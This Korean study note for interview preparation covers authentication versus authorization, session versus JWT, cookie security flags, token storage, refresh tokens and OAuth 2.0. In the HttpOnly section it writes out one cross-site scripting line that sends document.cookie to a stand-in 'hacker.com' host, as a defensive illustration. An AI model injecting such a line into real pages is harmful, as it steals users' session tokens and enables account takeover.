> **키워드**: `인증(AuthN)` `인가(AuthZ)` `JWT` `Session` `Cookie` `OAuth` `HttpOnly` `Refresh Token`

| 등급 | 섹션 | 의미 |
|------|------|------|
| 🔴 필수 | 인증 vs 인가, JWT vs Session, 쿠키 보안 속성 | 면접 최다 출제! |
| 🟡 이해 | JWT 구조, Refresh Token, OAuth 2.0 흐름 | 실무 설계 |

## 1. 인증(Authentication) vs 인가(Authorization) 🔴

> 💡 **비유: 회사 출입!**
> 인증 = 로비에서 사원증 보여주기 → "이 회사 직원이 맞네!" ✅
> 인가 = 서버실 문 앞에서 권한 확인 → "이 직원은 출입 등급이 부족해!" ❌

```
인증 (Authentication — AuthN):
  "당신은 누구인가?" 🪪
  → 아이디/비밀번호, 생체 인식, 2FA 등
  → 로그인 과정 자체!
  → 실패 시: 401 Unauthorized ⭐

인가 (Authorization — AuthZ):
  "당신은 무엇을 할 수 있는가?" 🔑
  → 로그인은 했지만, 이 기능을 쓸 권한이 있는가?
  → 일반 사용자가 관리자 페이지에 접근 → 차단!
  → 실패 시: 403 Forbidden ⭐

실무 흐름:
  1. 사용자가 로그인 요청 (인증!)
  2. 서버가 신원 확인 후 토큰/세션 발급
  3. 사용자가 보호된 리소스 요청 (토큰 첨부!)
  4. 서버가 토큰 검증 (인증!) + 권한 확인 (인가!)
  5. 권한이 있으면 → 데이터 반환!
     권한이 없으면 → 403!
     토큰이 없으면 → 401!
```

## 2. 상태 유지의 문제 — HTTP는 건망증! 🔴

> B-01에서 배웠듯이 HTTP는 무상태(Stateless)!
> 서버는 "방금 로그인한 사람"을 기억하지 않는다!
> → 그래서 매 요청마다 "나 아까 로그인했어!"라는 증거를 보내야 함!

```
증거를 보내는 방법 2가지:

  1. 세션(Session) 방식 🏨
     → 서버가 기억! 클라이언트는 번호표만 가짐!

  2. JWT(Token) 방식 🛂
     → 클라이언트가 여권처럼 직접 들고 다님! 서버는 안 기억!
```

## 3. 세션(Session) 방식 🔴

> 💡 **비유: 호텔의 VIP 장부!**
> 호텔(서버)이 고객의 모든 정보를 장부에 적어두고,
> 고객에게는 방 번호표(Session ID)만 줌!
> 식당에 가면 번호표만 보여주면 → 호텔이 장부에서 확인!

```
로그인 흐름:

  1. 사용자 → 서버: "아이디: kim, 비번: 1234"
  2. 서버: "확인! 세션 ID: abc123을 발급하고 장부에 기록!"
     장부(서버 메모리/Redis):
       abc123 → { userId: 42, name: "김철수", role: "admin" }
  3. 서버 → 브라우저: Set-Cookie: sessionId=abc123
  4. 이후 모든 요청: 브라우저가 자동으로 Cookie: sessionId=abc123 포함!
  5. 서버: "abc123? 장부 확인... 42번 김철수, 관리자네!"

장점:
  ✅ 보안 강함! (민감 정보가 서버에만!)
  ✅ 강제 로그아웃 가능! (장부에서 지우면 끝!)
  ✅ 동시 접속 제어 가능! (세션 수 제한!)

단점:
  ❌ 서버 메모리 사용! (사용자 많으면 부담!)
  ❌ 서버 여러 대면 세션 공유 문제! (Redis 필요!)
  ❌ Scale-out이 어려움!
```

## 4. JWT (JSON Web Token) 방식 🔴

> 💡 **비유: 여권!**
> 국가(서버)가 여권(토큰)에 이름/국적을 적고 도장(서명)을 찍어줌!
> 사용자가 여권을 직접 들고 다니며 → 입국심사에서 도장만 확인!
> 서버는 장부를 안 가지고 있어도 됨! → 무상태(Stateless)!

### JWT 구조

```
JWT = 3개 파트를 점(.)으로 연결!

eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjQyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
|______________________|________________________|___________________________________|
       Header                 Payload                     Signature
       (헤더)                 (데이터)                     (서명)

Header (헤더):
  { "alg": "HS256", "typ": "JWT" }
  → "이 토큰은 HS256 알고리즘으로 서명했어!"

Payload (데이터):
  { "userId": 42, "name": "김철수", "role": "admin", "exp": 1735689600 }
  → 사용자 정보 + 만료 시간!
  ⚠️ 암호화가 아니라 Base64 인코딩! (누구나 열어볼 수 있음!)
  ⚠️ 비밀번호, 개인정보 절대 넣지 마!

Signature (서명):
  HMAC(Header + Payload, 서버의_비밀키)
  → 서버만 아는 비밀키로 서명!
  → 데이터가 변조되면 서명이 안 맞음! → "위조 여권!" 차단!
```

### JWT 로그인 흐름

```
1. 사용자 → 서버: "아이디: kim, 비번: 1234"
2. 서버: "확인! JWT를 만들어서 줄게!"
   → Header + Payload를 비밀키로 서명!
3. 서버 → 브라우저: JWT 토큰 발급!
4. 이후 모든 요청: Authorization: Bearer eyJhbG...
5. 서버: "서명 확인... 위조 안 됐네! 42번 김철수, 관리자!"
   → DB 조회 없이 토큰만으로 인증 완료! (빠름!)

장점:
  ✅ 서버가 상태를 안 저장! (무상태! Scale-out 쉬움!)
  ✅ DB 조회 없이 CPU 연산만으로 인증! (빠름!)
  ✅ 마이크로서비스에서 서비스 간 인증에 유리!

단점:
  ❌ 발급 후 통제 불가! (강제 로그아웃 어려움!)
  ❌ 탈취당하면 만료 전까지 속수무책!
  ❌ Payload가 평문! (민감 정보 넣으면 안 됨!)
```

## 5. Session vs JWT 비교 🔴

```
┌──────────────┬───────────────────┬──────────────────┐
│              │ Session            │ JWT              │
├──────────────┼───────────────────┼──────────────────┤
│ 상태 저장    │ 서버 (메모리/Redis) │ 클라이언트 (토큰) │
│ 확장성       │ 어려움 (공유 필요!) │ 쉬움 (무상태!)    │
│ 보안         │ 강함 (서버에만!)    │ Payload 노출!    │
│ 강제 로그아웃│ 쉬움 (장부 삭제!)   │ 어려움!           │
│ 인증 속도    │ DB/Redis 조회      │ CPU 연산만!       │
│ 적합한 곳    │ 보안 중요 서비스    │ 대규모/마이크로    │
│              │ (은행, 의료)       │ (쇼핑몰, SNS)    │
└──────────────┴───────────────────┴──────────────────┘

실무: 대부분 JWT + Refresh Token 조합!
  → Access Token: 짧은 수명 (15분!)
  → Refresh Token: 긴 수명 (7일!)
  → Access Token 만료 → Refresh Token으로 재발급!
```

## 6. 쿠키(Cookie) 보안 속성 — 3대 자물쇠! 🔴

> 토큰을 어디에 저장할까? → **HttpOnly 쿠키가 정답!** ⭐

```
Set-Cookie: accessToken=eyJhbG...; HttpOnly; Secure; SameSite=Strict; Max-Age=900
```

### 🔒 HttpOnly

```
JavaScript로 쿠키 접근 차단!
  document.cookie → 접근 불가! ❌
  → XSS 공격으로 토큰 탈취 불가! ✅

❌ HttpOnly 없으면:
  해커의 XSS: fetch("hacker.com?token=" + document.cookie)
  → 토큰 탈취! 😱

✅ HttpOnly 있으면:
  해커의 XSS: document.cookie → undefined!
  → 탈취 불가! ✅

⚠️ 이 때문에 클라이언트 컴포넌트에서 쿠키를 직접 읽을 수 없음!
  → 서버 컴포넌트나 미들웨어에서만 쿠키 확인!
  → Next.js의 cookies() 함수 사용!
```

### 🔒 Secure

```
HTTPS에서만 쿠키 전송!
  HTTP(암호화 안 됨)에서는 쿠키를 안 보냄!
  → 중간자 공격으로 쿠키 도청 방지!

⚠️ localhost는 예외! (개발 편의!)
⚠️ 배포 시 HTTPS 필수! (Vercel은 자동!)
```

### 🔒 SameSite

```
다른 사이트에서 쿠키 전송 제한!
  → CSRF 공격 방지!

Strict: 같은 사이트에서만 쿠키 전송! (가장 안전!)
  → 외부 링크 클릭해서 들어오면 로그인 풀려 보임 (UX 주의!)

Lax: 링크 클릭 이동은 허용! POST는 차단! (기본값!)
  → 가장 균형 잡힌 옵션! ⭐

None: 제한 없음! (Secure 필수!)
  → 서드파티 쿠키 필요할 때만!
```

## 7. 토큰 저장 위치 비교 🔴

```
어디에 JWT를 저장할까?

┌──────────────┬──────────┬──────────┬──────────────┐
│              │ HttpOnly │ Local    │ 일반         │
│              │ Cookie ⭐ │ Storage  │ Cookie       │
├──────────────┼──────────┼──────────┼──────────────┤
│ XSS 방어    │ ✅ 완벽!  │ ❌ 취약! │ ❌ 취약!     │
│ CSRF 방어   │ SameSite │ ✅ 안전  │ SameSite    │
│ 자동 전송   │ ✅ 자동!  │ ❌ 수동  │ ✅ 자동!     │
│ JS 접근     │ ❌ 불가!  │ ✅ 가능  │ ✅ 가능      │
│ 용량        │ 4KB      │ 5~10MB   │ 4KB          │
├──────────────┼──────────┼──────────┼──────────────┤
│ 추천        │ ⭐ 인증!  │ UI 설정  │ ❌ 사용금지! │
│ 용도        │ JWT 토큰! │ 다크모드 │              │
└──────────────┴──────────┴──────────┴──────────────┘

정답: JWT → HttpOnly + Secure + SameSite 쿠키! ⭐
  → XSS로 훔칠 수 없고!
  → CSRF도 SameSite로 방어!
  → 브라우저가 자동으로 매 요청에 포함!
```

## 8. Access Token + Refresh Token 패턴 🟡

```
Access Token만 쓰면?
  수명이 길면 → 탈취 시 오래 악용됨! 😱
  수명이 짧으면 → 5분마다 다시 로그인? 😡

해결: 2개의 토큰!
  Access Token: 수명 15분! (짧음!)
    → API 요청에 사용!
    → 탈취당해도 15분 후 만료!

  Refresh Token: 수명 7일! (김!)
    → Access Token 재발급에만 사용!
    → HttpOnly 쿠키에 안전하게 보관!

흐름:
  1. 로그인 → Access + Refresh 토큰 발급!
  2. API 요청 → Access Token 포함!
  3. 15분 후 Access 만료 → 401 에러!
  4. 클라이언트 → Refresh Token으로 새 Access 요청!
  5. 서버 → Refresh 확인 → 새 Access 발급!
  6. 사용자는 로그인 안 풀린 채로 계속 사용!
  7. 7일 후 Refresh도 만료 → 다시 로그인!
```

## 9. OAuth 2.0 — 소셜 로그인! 🟡

> 💡 **비유: 대리 인증!**
> "우리 사이트에 직접 회원가입 안 해도 돼!
>  구글/카카오가 '이 사람 진짜야!' 보증해줄 거야!"

```
OAuth = 다른 서비스(구글, 카카오)에게 인증을 위임!

흐름 (Authorization Code Grant):

  1. 사용자 → 내 사이트: "구글로 로그인!" 클릭
  2. 내 사이트 → 구글: "이 사용자를 인증해줘!" (리다이렉트!)
  3. 사용자 → 구글: "아이디/비번 입력!" (구글 로그인 화면!)
  4. 구글 → 내 사이트: "인증 성공! 인가 코드(code)를 줄게!"
  5. 내 사이트(서버) → 구글 서버: "이 code로 토큰 줘!"
  6. 구글 서버 → 내 사이트: "Access Token이야!"
  7. 내 사이트 → 구글 API: "이 토큰으로 사용자 정보 줘!"
  8. 구글 → 내 사이트: "이름: 김철수, 이메일: kim@gmail.com"
  9. 내 사이트: 회원 DB에 저장 → 자체 JWT 발급 → 로그인 완료!

Next.js 실무:
  → NextAuth.js (Auth.js) 라이브러리 사용! ⭐
  → 구글, 카카오, GitHub 등 설정만 하면 끝!
```

## 면접 대비

### 🔴 필수 질문

**Q1. 인증(Authentication)과 인가(Authorization)의 차이?**

> 인증은 "당신이 누구인지" 확인하는 과정으로 로그인이 대표적이며, 실패 시 401을 반환한다. 인가는 "인증된 사용자가 특정 리소스에 접근할 권한이 있는지" 확인하는 과정으로, 일반 사용자가 관리자 페이지에 접근하면 403을 반환한다. 401은 이름은 Unauthorized이지만 실제 의미는 Unauthenticated(인증 실패)이다.

**Q2. JWT와 Session 방식의 차이와 각각의 장단점?**

> Session은 서버가 사용자 상태를 메모리/Redis에 저장하고 클라이언트에는 Session ID만 전달한다. 보안이 강하고 강제 로그아웃이 쉽지만, 서버 여러 대에서 세션 공유가 필요하여 Scale-out이 어렵다. JWT는 클라이언트가 토큰을 직접 보관하며 서버는 상태를 저장하지 않아(Stateless) 수평 확장에 유리하다. 단, Payload가 Base64 인코딩(평문)이므로 민감 정보를 넣으면 안 되고, 발급 후 강제 무효화가 어렵다. 실무에서는 짧은 수명의 Access Token + 긴 수명의 Refresh Token 조합을 사용한다.

**Q3. JWT를 어디에 저장해야 하나요?**

> HttpOnly + Secure + SameSite 속성이 설정된 쿠키에 저장하는 것이 가장 안전하다. HttpOnly는 JavaScript의 document.cookie 접근을 차단하여 XSS 공격으로 토큰을 탈취할 수 없게 하고, Secure는 HTTPS에서만 전송하여 도청을 방지하며, SameSite는 다른 사이트의 요청에 쿠키를 포함하지 않아 CSRF를 방어한다. localStorage는 XSS에 취약하여 인증 토큰 저장에 부적합하다.

**Q4. OAuth 2.0의 흐름을 간단히 설명해주세요.**

> 사용자가 "구글로 로그인"을 클릭하면 구글 로그인 페이지로 리다이렉트된다. 사용자가 구글에서 인증하면 구글이 인가 코드(code)를 우리 서버로 보낸다. 서버는 이 코드와 Client Secret을 구글에 보내 Access Token을 받고, 이 토큰으로 구글 API에서 사용자 정보(이름, 이메일)를 가져와 자체 회원 처리를 한다. Next.js에서는 Auth.js(NextAuth) 라이브러리로 이 전체 흐름을 간편하게 구현할 수 있다.

```

│  인증/인가 핵심 요약                              │

│                                                │

│  Session: 서버가 기억! (보안 강, Scale-out 약)    │

│                                                │
│  JWT 구조: Header.Payload.Signature             │
│    ⚠️ Payload는 평문! 민감 정보 금지!            │
│                                                │
│  토큰 저장: HttpOnly Cookie가 정답! ⭐           │
```
